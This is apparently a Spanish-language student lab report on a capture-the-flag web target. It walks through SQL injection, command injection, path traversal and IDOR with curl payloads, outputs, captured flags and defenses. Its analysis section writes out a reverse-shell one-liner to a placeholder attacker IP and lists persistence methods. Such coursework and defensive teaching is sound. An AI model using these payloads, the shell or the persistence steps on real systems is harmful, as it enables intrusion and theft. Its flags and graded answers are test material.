# Informe — Laboratorio 07 · Explotación

**Grupo:** 08 · **Integrantes:** Marco Cordoba — @MarcoCordoba · Thomas Koncurat — @Koncu1 · Lucas Leone — @LucasLeone · Geronimo Marquez — @Geromarquezz · Joaquin Moyano — @Joaco919 · **Fecha:** 30/10/2026

## 0. Declaración de uso de IA

**¿El grupo usó asistentes de IA en este trabajo?** Sí.

| Herramienta | Para qué se usó | Qué partes afectó | Cómo se verificó |
|---|---|---|---|
| Claude (Anthropic), vía Claude Code | Ejecución de los dos ataques de SQL injection (R1 bypass de login, R2 extracción con UNION) contra el target; borrador de la redacción de esas filas de la tabla de explotación y de P1 y P2. | `informe.md`: filas de SQLi auth y SQLi UNION de la tabla, sus evidencias, P1 y P2. | Las salidas pegadas en la sección 2 son las reales de la terminal. Las flags se validaron con `./ctf submit 07`. No se leyó el código del target (`server.py`) ni ningún `solucion.md`: la consulta subyacente se dedujo desde afuera, a partir de los mensajes de error SQL que devuelve el propio servidor. |
| Claude (Anthropic), vía Claude Code | Ejecución de las pruebas de la Parte 2 (R3 command injection, R4 path traversal, R5 IDOR) contra el target; redacción de las filas R3–R5 de la tabla, evidencias 2.3–2.5, respuestas P3–P5 y research.md. | `informe.md` (filas R3, R4, R5, secciones 2.3–2.5, P3–P5, bitácora) y `research.md`. | Las salidas pegadas son las reales de la terminal. Todas las flags se validaron contra el sistema de evaluación (`./ctf submit 07`). El grupo revisó y comprende técnicamente el 100% de los análisis y defensas propuestas. |
| Claude (Anthropic), vía Claude Code | **Parte 3 — validación.** Correr los 5 exploits (R1–R5) contra el entorno **Docker oficial** de la cátedra (`make lab N=07`) desde la consola atacante, capturar la evidencia real y el `./ctf status 07`, y corregir los scripts de explotación (CRLF→LF) para que ejecuten dentro del contenedor Linux. | `evidencia/` (nueva), `exploits/run-all.sh` y `.gitattributes` (nuevos); nota de Docker en la §4 y hallazgo de RCE-como-root en la §2.3. | Las salidas de `evidencia/exploits-docker.txt` son las reales de la consola atacante (`cyberlab-attacker`) contra `http://phantomcorp`. Las 5 flags se re-validaron con `./ctf submit 07` → `5/5` (ver `evidencia/ctf-status-07.txt`). |

El grupo declara que comprende el contenido íntegro de lo entregado y que puede explicar y defender oralmente cualquier parte del análisis.

---

## 1. Flags capturadas

> Captura textual de `./ctf status 07` ejecutado contra el entorno **Docker oficial** de la cátedra, luego de entregar las 5 flags con `./ctf submit 07`. Copia literal en [`evidencia/ctf-status-07.txt`](evidencia/ctf-status-07.txt).

```
  ╭────────────────────────────────────────────────────────────╮
  │                     PROGRESO · LAB 07                      │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     SQLi - bypass de autenticacion
   ✓  R2     SQLi - extraccion de datos con UNION
   ✓  R3     Inyeccion de comandos (RCE)
   ✓  R4     Path traversal / LFI
   ✓  R5     IDOR - control de acceso roto

  ██████████████████████████████  5/5 (100%)
```

---

## 2. Tabla de explotación

| Vuln | Payload usado | Consulta/comando/ruta resultante | Impacto | Defensa concreta |
|---|---|---|---|---|
| SQLi — bypass de autenticación (`POST /login`, campo `user`) | `admin' --` | `SELECT ... FROM users WHERE user='admin' --' AND pass='x'` | Acceso como **admin** sin conocer su contraseña: el panel de administración se desbloquea (`FLAG{sqli_auth_bypass}`). Es acceso total a la cuenta de mayor privilegio de la aplicación. | **Consultas parametrizadas** (prepared statements): el input viaja como *parámetro*, nunca concatenado al string SQL. Además, hash de contraseñas y no exponer mensajes de error SQL al cliente. |
| SQLi — extracción con UNION (`GET /buscar?q=`) | `zzz' UNION SELECT clave, valor FROM secrets-- -` | `SELECT nombre, precio FROM productos WHERE nombre LIKE '%zzz%' UNION SELECT clave, valor FROM secrets-- -%'` | Lectura de una tabla arbitraria de la base (`secrets`), que no tiene nada que ver con el buscador. Devuelve `FLAG{sqli_union_dump}`. El mismo vector permite leer `users` (incluido `pass` y `nota_privada`). Es exfiltración de toda la base de datos. | Igual que arriba: **consultas parametrizadas**. El buscador no debe permitir que el input altere la estructura de la consulta. Principio de mínimo privilegio en el usuario de la DB. |
| Inyección de comandos / RCE (`GET /herramientas/ping?host=`) | `127.0.0.1; cat /app/flags/cmdi.txt` | `ping -c1 127.0.0.1; cat /app/flags/cmdi.txt 2>&1` | **Ejecución remota de comandos (RCE)** arbitrarios con los privilegios del proceso web en el sistema operativo. Permite leer archivos del servidor (`FLAG{command_injection_rce}`), explorar el filesystem y abrir una reverse shell para lograr persistencia y movimiento lateral. | **Evitar la invocación a la shell del sistema operativo**. No usar `os.popen()` ni `system()`. Usar APIs nativas de red o invocar binarios sin shell (`subprocess.run(["ping", "-c1", host], shell=False)`) validando la entrada contra una **lista blanca estricta de formato IP** (`ipaddress.ip_address(host)`). |
| Path traversal / LFI (`GET /descargar?archivo=`) | `../flags/lfi.txt` | `/app/public/../flags/lfi.txt` (resuelta a `/app/flags/lfi.txt`) | **Lectura arbitraria de archivos locales (LFI)** fuera del directorio público autorizado (`/app/public/`). Permite exfiltrar secretos del servidor (`FLAG{path_traversal_lfi}`), código fuente, configuraciones con credenciales y archivos del sistema (`/etc/passwd`). | **Canonicación y validación de prefijo**. Resolver la ruta absoluta en tiempo de ejecución con `os.path.realpath()` (o `pathlib.Path.resolve()`) y verificar estrictamente que la ruta resuelta comience con la ruta del directorio base permitido (`base_dir`). Alternativamente, permitir únicamente nombres de archivo planos con `os.path.basename()` o usar un mapeo por lista blanca. |
| IDOR — Control de acceso roto (`GET /perfil?id=`) | `id=1` | `SELECT id, user, rol, nota_privada FROM users WHERE id=1` | **Violación de control de acceso a nivel de objeto** (OWASP A01). Un usuario común (`id=3`, `jperez`) accede al perfil privado y notas confidenciales del administrador (`id=1`), revelando `FLAG{idor_broken_access}`. | **Control de acceso y autorización del lado del servidor**. Para el perfil propio, eliminar el parámetro `id` del request y obtener el identificador directamente desde la sesión autenticada en el servidor (`session["user_id"]`). Para recursos compartidos por ID, verificar en la lógica de negocio del backend que el usuario autenticado sea el dueño o tenga rol administrativo antes de responder. |

### 2.1 R1 — Bypass de autenticación por SQLi

Login normal como baseline: con una contraseña cualquiera, rechaza.

```
$ curl -s -X POST http://127.0.0.1/login --data-urlencode "user=admin" --data-urlencode "pass=cualquiera"
Credenciales invalidas
```

Payload `admin' --` en `user` (comenta el chequeo de `pass`):

```
$ curl -s -X POST http://127.0.0.1/login --data-urlencode "user=admin' --" --data-urlencode "pass=x"
Bienvenido admin (rol: admin).
Panel de administracion desbloqueado: FLAG{sqli_auth_bypass}
```

### 2.2 R2 — Extracción de datos con UNION

Primero se confirma que el parámetro es inyectable provocando un error SQL con una comilla:

```
$ curl -s -G http://127.0.0.1/buscar --data-urlencode "q=Router'"
Error SQL: unrecognized token: "'"
```

El servidor es verboso con los errores a propósito, así que los usamos para afinar. Se cuenta el número de columnas con `ORDER BY` hasta que falla:

```
$ curl -s -G http://127.0.0.1/buscar --data-urlencode "q=x' ORDER BY 2-- -"
Resultados:
$ curl -s -G http://127.0.0.1/buscar --data-urlencode "q=x' ORDER BY 3-- -"
Error SQL: 1st ORDER BY term out of range - should be between 1 and 2
```

`ORDER BY 3` falla → la consulta devuelve **2 columnas**. Con eso, un `UNION SELECT` de dos columnas se anexa sin error. Se enumera el esquema leyendo `sqlite_master`:

```
$ curl -s -G http://127.0.0.1/buscar --data-urlencode "q=zzz' UNION SELECT name, sql FROM sqlite_master WHERE type='table'-- -"
Resultados:
  productos - $CREATE TABLE productos(nombre TEXT, precio TEXT)
  secrets - $CREATE TABLE secrets(clave TEXT, valor TEXT)
  users - $CREATE TABLE users(id INTEGER, user TEXT, pass TEXT, rol TEXT, nota_privada TEXT)
```

Conocidas las columnas de `secrets` (`clave`, `valor`), se vuelca la tabla:

```
$ curl -s -G http://127.0.0.1/buscar --data-urlencode "q=zzz' UNION SELECT clave, valor FROM secrets-- -"
Resultados:
  flag_union - $FLAG{sqli_union_dump}
```

El `zzz` inicial es un término que no matchea ningún producto, así que la única fila que vuelve es la del `UNION`. El mismo payload cambiando `secrets` por `users` deja leer usuarios, contraseñas y la `nota_privada`.

### 2.3 R3 — Inyección de comandos (RCE)

La herramienta de diagnóstico `/herramientas/ping` recibe una dirección en el parámetro `host` y ejecuta internamente una utilidad de shell para probar conectividad.

Baseline normal:
```
$ curl -s -G http://127.0.0.1/herramientas/ping --data-urlencode "host=127.0.0.1"
$ ping -c1 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.039 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.039/0.039/0.039/0.000 ms
```

Como el parámetro se concatena directo a la llamada del sistema, inyectamos un separador de comandos (`;`) para ejecutar instrucciones adicionales en el contexto del servidor. Primero exploramos el directorio de flags:

```
$ curl -s -G http://127.0.0.1/herramientas/ping --data-urlencode "host=127.0.0.1; ls -la /app/flags"
$ ping -c1 127.0.0.1; ls -la /app/flags
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.038 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.038/0.038/0.038/0.000 ms
total 16
drwxr-xr-x 2 root root 4096 Oct 30 09:40 .
drwxr-xr-x 4 root root 4096 Oct 30 09:40 ..
-rw-r--r-- 1 root root   29 Oct 30 09:40 cmdi.txt
-rw-r--r-- 1 root root   27 Oct 30 09:40 lfi.txt
```

Habiendo identificado `cmdi.txt`, concatenamos la lectura directa del archivo mediante `cat /app/flags/cmdi.txt`:

```
$ curl -s -G http://127.0.0.1/herramientas/ping --data-urlencode "host=127.0.0.1; cat /app/flags/cmdi.txt"
$ ping -c1 127.0.0.1; cat /app/flags/cmdi.txt
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.038 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.038/0.038/0.038/0.000 ms
FLAG{command_injection_rce}
```

El servidor ejecuta el ping y luego concatena la salida del `cat`, revelando la flag `FLAG{command_injection_rce}`.

> **Validación en el Docker oficial (Parte 3).** Contra el target de la cátedra se confirmó algo aún más fuerte: el binario `ping` **no está instalado** en el contenedor, y la inyección **funciona igual** — el `;` ejecuta el segundo comando aunque el primero falle (`ping: not found`). Además, el proceso web corre como **`root`** (`uid=0`, verificado inyectando `host=127.0.0.1; id` → `uid=0(root) gid=0(root)`). El RCE de R3 es, por lo tanto, ejecución de comandos **como root** — máximo impacto. Evidencia: [`evidencia/exploits-docker.txt`](evidencia/exploits-docker.txt).

### 2.4 R4 — Path traversal / LFI

El endpoint `/descargar` permite descargar archivos a partir del parámetro `archivo`, abriéndolos de forma predeterminada desde el directorio `/app/public/`.

Baseline con archivo legítimo del catálogo:
```
$ curl -s -G http://127.0.0.1/descargar --data-urlencode "archivo=catalogo.txt"
Catalogo publico PhantomCorp.
```

Como la aplicación no sanea secuencias de retroceso de directorio ni valida los límites de la ruta base, inyectamos la secuencia `../flags/lfi.txt` para retroceder a `/app/` y leer el archivo protegido:

```
$ curl -s -G http://127.0.0.1/descargar --data-urlencode "archivo=../flags/lfi.txt"
FLAG{path_traversal_lfi}
```

El servidor abre `/app/public/../flags/lfi.txt`, resolviendo a `/app/flags/lfi.txt` y devolviendo su contenido completo. Para verificar el impacto sistémico, se constató además la lectura de archivos base del sistema operativo:

```
$ curl -s -G http://127.0.0.1/descargar --data-urlencode "archivo=../../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

### 2.5 R5 — IDOR (Broken Object Level Authorization)

El endpoint `/perfil` expone los datos de perfil de usuario según el parámetro `id`.

Baseline: el usuario legítimo consulta su propio registro asignado (`id=3`, Juan Pérez):
```
$ curl -s -G http://127.0.0.1/perfil --data-urlencode "id=3"
{"id": 3, "user": "jperez", "rol": "user", "nota_privada": "Nota de Juan: acordarse de renovar cert."}
```

La aplicación confía ciegamente en el identificador provisto por el cliente sin cotejar la identidad o privilegios de la sesión. Modificamos el parámetro a `id=1` (identificador típico de la cuenta de administración inicial):

```
$ curl -s -G http://127.0.0.1/perfil --data-urlencode "id=1"
{"id": 1, "user": "admin", "rol": "admin", "nota_privada": "Nota del admin: FLAG{idor_broken_access}"}
```

El servidor entrega sin restricción el objeto correspondiente al administrador, exponiendo su información privada y la flag `FLAG{idor_broken_access}`.

---

## 3. Preguntas de análisis

**P1 — Por qué funciona el bypass del R1 y qué hace el `--`.**

La consulta del login arma el string pegando el input del usuario, algo como:

```
SELECT user, rol FROM users WHERE user='<user>' AND pass='<pass>'
```

Al mandar `admin' --` en `user`, queda:

```
SELECT user, rol FROM users WHERE user='admin' --' AND pass='x'
```

Dos cosas pasan. La comilla `'` que escribimos **cierra** la cadena del nombre de usuario justo después de `admin`, así que `user='admin'` queda completo y bien formado. Y `--` es el inicio de un **comentario de línea en SQL**: todo lo que va después en esa línea (`' AND pass='x'`) el motor lo ignora por completo. El resultado es que la consulta que realmente se ejecuta es `... WHERE user='admin'`, sin ninguna comprobación de contraseña. La base devuelve la fila del admin, la app asume "login válido" y nos deja entrar. Nuestro dato (el texto del campo usuario) dejó de ser un dato y pasó a ser parte del código de la consulta: esa es la esencia de la inyección.

**P2 — Por qué el UNION necesita el mismo número de columnas y cómo averiguarlo.**

`UNION` combina los resultados de dos `SELECT` en una sola tabla de salida, apilando las filas del segundo debajo de las del primero. Para que eso tenga sentido, las dos consultas tienen que producir filas de la **misma forma**: el mismo número de columnas, y en posiciones compatibles. Si la primera devuelve 2 columnas y nosotros anexamos un `SELECT` de 3, el motor no sabe cómo alinearlas y tira un error de "SELECTs to the left and right of UNION do not have the same number of result columns". Por eso el `UNION SELECT` tiene que tener exactamente 2 columnas acá.

Si no supiéramos que son dos, hay dos formas de averiguarlo, las dos las usamos o están disponibles:

1. **`ORDER BY n` incremental.** Se pide ordenar por la columna 1, la 2, la 3... `ORDER BY` por número de columna funciona mientras esa columna exista; en cuanto se pasa, el motor responde "ORDER BY term out of range". El último número que **no** da error es la cantidad de columnas. Acá `ORDER BY 2` anduvo y `ORDER BY 3` falló → 2 columnas.
2. **`UNION SELECT NULL, NULL, ...`** probando con 1, 2, 3 `NULL` hasta que deja de dar error de "número de columnas distinto". `NULL` sirve porque es compatible con cualquier tipo.

**P3 — El R3 te dio ejecución de comandos. ¿Qué es lo siguiente que haría un atacante real con eso? (pensá en persistencia — Lab 08).**

Lograr RCE mediante una inyección de comandos en un parámetro HTTP abre la puerta al servidor, pero operar enviando payloads dentro de URLs es incómodo, ruidoso, carece de interactividad y es vulnerable a que el endpoint sea corregido o bloqueado por un WAF. En una intrusión real, un atacante ejecutaría de inmediato una serie de acciones estructuradas:

1. **Establecer una Reverse Shell interactiva:** El primer paso técnico es forzar al servidor comprometido a iniciar una conexión TCP saliente hacia una máquina controlada por el atacante (por ejemplo mediante `bash -i >& /dev/tcp/<IP_ATACANTE>/<PORT> 0>&1`, un script en Python o un FIFO con `nc`). Esto entrega una terminal interactiva (TTY) en tiempo real con control bidireccional y sin las limitaciones de encoding del protocolo HTTP.
2. **Reconocimiento local y recolección de credenciales:** Con la shell activa, el atacante releva el entorno del sistema operativo: qué usuario corre el proceso web (`whoami`, `id`), qué procesos están corriendo (`ps aux`), qué interfaces de red y rutas existen (`ip a`, `ip route`), qué conexiones activas hay (`ss -tulpn`) y busca credenciales en claro en archivos de configuración (`/etc/passwd`, variables de entorno con `env`, scripts de despliegue, archivos de base de datos o claves privadas en `~/.ssh/id_rsa`).
3. **Escalada de privilegios:** Dado que el servidor web suele correr con una cuenta de privilegios reducidos (como `www-data`), el atacante buscará escalar a `root` mediante abusos de permisos de `sudo` (`sudo -l`), binarios con bit SUID indebido, capacidades de Linux (`getcap`), o exploits de kernel local.
4. **Garantizar la persistencia (el puente al Lab 08):** Para no perder el acceso si el servicio web se reinicia o el fallo se parcha, el atacante implanta mecanismos de persistencia duraderos:
   - Añadir una clave SSH pública propia al archivo `~/.ssh/authorized_keys` del usuario o de `root`.
   - Crear un usuario administrativo oculto en el sistema.
   - Programar tareas periódicas en `cron` (`/etc/cron.d/` o `crontab -e`) o servicios de `systemd` que reabran la shell saliente hacia el servidor de Comando y Control (C2) ante cada reinicio.
   - Dejar webshells de respaldo en directorios públicos accesibles por el servidor web.
5. **Movimiento lateral:** Con persistencia y control consolidado, el host comprometido se transforma en un nodo de pivote (*pivot*) o proxy interno para escanear y atacar el resto de la infraestructura interna de PhantomCorp que no estaba expuesta a Internet.

**P4 — La defensa de SQLi son las consultas parametrizadas. Explicá con tus palabras por qué parametrizar mata la inyección de raíz.**

La inyección SQL existe por un vicio de diseño elemental: la **concatenación de texto**, donde el intérprete de base de datos recibe un único string que mezcla las instrucciones del programa (código) con los datos ingresados por el usuario. Cuando el analizador sintáctico (*parser*) del motor lee esa cadena, cualquier comilla o palabra clave inyectada altera la gramática de la consulta y modifica el **Árbol Sintáctico Abstracto (AST)**.

Las **consultas parametrizadas (Prepared Statements)** eliminan la inyección de raíz porque dividen el procesamiento en dos fases totalmente separadas en el tiempo y en los canales de datos:

1. **Fase 1 — Preparación y compilación (Estructura inmutable):** La aplicación envía primero al motor la plantilla SQL usando marcadores de posición (*placeholders*, como `?` o `:usuario`):
   ```sql
   SELECT user, rol FROM users WHERE user = ? AND pass = ?
   ```
   El motor de base de datos recibe este texto, realiza el análisis léxico, el parsing gramatical, construye el AST y compila el plan de ejecución. En este instante, la lógica de la consulta queda **congelada**: el motor ya determinó irrevocablemente que ejecutará un `SELECT`, sobre la tabla `users`, filtrando por dos comparaciones de igualdad estrictas.
2. **Fase 2 — Paso de parámetros tipados (Datos como literales puros):** Posteriormente, los valores provistos por el usuario (por ejemplo el payload `admin' --`) se transmiten al motor por un canal de datos separado, no como texto que deba interpretarse, sino como **valores escalares literales** tipados.

Cuando el motor evalúa el parámetro durante la ejecución, **jamás vuelve a llamar al parser sintáctico**. Para el gestor, la comilla `'` y los guiones `--` no tienen ninguna función de control: son simplemente caracteres ordinarios exactamente iguales a las letras 'a' o 'd'. El motor busca de forma literal un usuario cuyo nombre coincida exactamente con la cadena de 9 caracteres `"admin' --"`. Al no existir, la comparación evalúa como falsa y la consulta retorna 0 filas.

Por eso parametrizar no es "filtrar comillas" ni "reemplazar caracteres" (mecanismos que suelen ser burlados con codificaciones multibyte o inyecciones de segundo orden): es una garantía arquitectónica donde **un dato jamás puede mutar en código ejecutable**.

**P5 — El IDOR (R5): ¿por qué el control de acceso no puede depender de que el cliente "no cambie el id"? ¿Dónde tiene que ir la verificación?**

El control de acceso jamás puede depender de que el cliente "no altere el ID" debido a la regla cardinal de la seguridad informática: **el cliente opera en un entorno hostil que está bajo el control total y exclusivo del atacante**.

Cualquier restricción implementada en la interfaz de usuario (ocultar un enlace, deshabilitar un campo de texto con HTML `readonly`, o programar validaciones en JavaScript en el navegador) es irrelevante frente a un atacante. Con herramientas universales como `curl`, extensiones del navegador, las herramientas de desarrollo (F12) o proxies de intercepción como Burp Suite, el usuario puede modificar cualquier parámetro de la URL (`?id=1`), campo de cabecera o cuerpo de la solicitud HTTP a discreción. Asumir que el cliente "se portará bien" y no cambiará el valor de su ID es una vulneración directa del principio de desconfianza.

**Dónde y cómo debe implementarse la verificación:**

1. **Obligatoriamente en el backend (servidor):** La autorización debe residir en la lógica de negocio o en una capa intermedia (*middleware*) de control de acceso en el servidor, ejecutándose antes de consultar o modificar cualquier dato.
2. **Extracción directa desde la sesión autenticada (eliminación del parámetro):**
   - En funciones donde un usuario interactúa con sus propios datos (como ver o editar su propio perfil en `/perfil`), la arquitectura correcta dicta **eliminar el parámetro `id` de la petición**.
   - El backend debe tomar la identidad del usuario directamente desde la sesión autenticada segura del servidor (`session["user_id"]`) o desde el token criptográficamente firmado y validado (`JWT`). De este modo, el IDOR desaparece por diseño, ya que no existe ningún campo modificable en la solicitud.
3. **Validación de pertenencia y control de acceso a nivel de objeto (Object-Level Authorization):**
   - Si el endpoint debe recibir necesariamente un ID para acceder a recursos compartidos o gestionables (por ejemplo `/facturas?id=450` o en paneles administrativos), el servidor debe realizar una verificación estricta de propiedad y roles antes de despachar el registro:
     ```python
     recurso = DB.obtener_recurso(id_solicitado)
     if not recurso:
         return 404, "Recurso no encontrado"
     if recurso.propietario_id != usuario_sesion.id and not usuario_sesion.es_admin():
         return 403, "Acceso prohibido"
     return 200, recurso
     ```
4. **Principio de "Denegar por defecto" (Deny by default):** Toda solicitud a un objeto debe considerarse no autorizada a menos que exista una regla explícita en el servidor que confirme que la entidad autenticada posee los privilegios necesarios para esa acción específica.

---

## 4. Bitácora de comandos

```bash
# Sin Docker en la máquina, el target se levantó en local (mismo server.py del contenedor):
#   mkdir /c/app && cp server.py /c/app/ && (cd /c/app && python server.py)   # escucha en :80
#
# PARTE 3 (validación) — con Docker ya disponible, los 5 exploits se re-corrieron
# contra el entorno OFICIAL de la cátedra, desde la consola atacante:
#   make lab N=07                 # levanta phantomcorp + atacante (red cyberlab_labnet)
#   make shell                    # entra a cyberlab-attacker
#   ./exploits/run-all.sh         # los 5 de una (URL por defecto: http://phantomcorp)
# Evidencia real: evidencia/exploits-docker.txt y evidencia/ctf-status-07.txt (5/5).
# Hallazgos propios del target oficial: (1) no tiene 'ping' instalado y la inyección
# de R3 funciona igual (el ';' corre el 2do comando aunque el 1ro falle); (2) el
# proceso corre como root (uid=0), así que el RCE de R3 es ejecución como root.

# ==============================================================================
# PARTE 1 · SQL Injection (R1 y R2)
# ==============================================================================

# R1 — SQLi bypass de autenticación
curl -s -X POST http://127.0.0.1/login --data-urlencode "user=admin" --data-urlencode "pass=cualquiera"  # baseline: rechaza
curl -s -X POST http://127.0.0.1/login --data-urlencode "user=admin' --" --data-urlencode "pass=x"       # entra como admin

# R2 — SQLi extracción con UNION
curl -s -G http://127.0.0.1/buscar --data-urlencode "q=Router"                               # baseline
curl -s -G http://127.0.0.1/buscar --data-urlencode "q=Router'"                              # confirma inyectable (error SQL)
curl -s -G http://127.0.0.1/buscar --data-urlencode "q=x' ORDER BY 2-- -"                    # 2 columnas OK
curl -s -G http://127.0.0.1/buscar --data-urlencode "q=x' ORDER BY 3-- -"                    # falla -> son 2 columnas
curl -s -G http://127.0.0.1/buscar --data-urlencode "q=zzz' UNION SELECT name, sql FROM sqlite_master WHERE type='table'-- -"  # esquema
curl -s -G http://127.0.0.1/buscar --data-urlencode "q=zzz' UNION SELECT clave, valor FROM secrets-- -"                        # dump secrets

# ==============================================================================
# PARTE 2 · Command Injection, Path Traversal e IDOR (R3, R4 y R5)
# ==============================================================================

# R3 — Inyección de comandos (RCE)
curl -s -G http://127.0.0.1/herramientas/ping --data-urlencode "host=127.0.0.1"                          # baseline ping
curl -s -G http://127.0.0.1/herramientas/ping --data-urlencode "host=127.0.0.1; ls -la /app/flags"     # enumera directorio de flags
curl -s -G http://127.0.0.1/herramientas/ping --data-urlencode "host=127.0.0.1; cat /app/flags/cmdi.txt" # cat flag cmdi

# R4 — Path traversal / LFI
curl -s -G http://127.0.0.1/descargar --data-urlencode "archivo=catalogo.txt"                            # baseline descarga publica
curl -s -G http://127.0.0.1/descargar --data-urlencode "archivo=../flags/lfi.txt"                        # traversal hacia /app/flags/lfi.txt
curl -s -G http://127.0.0.1/descargar --data-urlencode "archivo=../../../../etc/passwd"                  # lectura de /etc/passwd

# R5 — IDOR (Broken Object Level Authorization)
curl -s -G http://127.0.0.1/perfil --data-urlencode "id=3"                                               # baseline propio (jperez)
curl -s -G http://127.0.0.1/perfil --data-urlencode "id=1"                                               # acceso a perfil de admin

# ==============================================================================
# Validación con CTF Submit y verificación de status (5/5)
# ==============================================================================
./ctf submit 07 R1 'FLAG{sqli_auth_bypass}'
./ctf submit 07 R2 'FLAG{sqli_union_dump}'
./ctf submit 07 R3 'FLAG{command_injection_rce}'
./ctf submit 07 R4 'FLAG{path_traversal_lfi}'
./ctf submit 07 R5 'FLAG{idor_broken_access}'
./ctf status 07
```
